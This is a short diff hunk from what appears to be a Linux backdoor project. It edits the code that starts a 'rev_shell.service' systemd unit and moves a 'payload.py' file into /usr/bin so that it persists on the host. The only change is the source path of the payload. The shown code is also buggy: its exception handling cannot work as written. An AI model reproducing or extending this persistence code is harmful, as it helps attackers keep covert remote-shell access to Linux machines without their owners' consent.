@@ -86,11 +86,11 @@ WantedBy=multi-user.target
             subprocess.call(['systemctl', 'start', 'rev_shell.service'])
         # move the executable to the tmp directory
         try:
-            subprocess.call(['mv', '/root/payload.py', '/usr/bin/payload.py'])
+            subprocess.call(['mv', '/home/owner/Downloads/Linuxbackdoor/payload/payload.py', '/usr/bin/payload.py'])
             # if the file is not found, it will throw an exception, so we need to create the file
             if FileNotFoundError:
                 subprocess.call(['touch', '/usr/bin/payload.py'])
-                subprocess.call(['mv', '/root/payload.py', '/usr/bin/payload.py'])
+                subprocess.call(['mv', '/home/owner/Downloads/Linuxbackdoor/payload/payload.py', '/usr/bin/payload.py'])
         except Exception as e:
             print("" % e)
         finally:
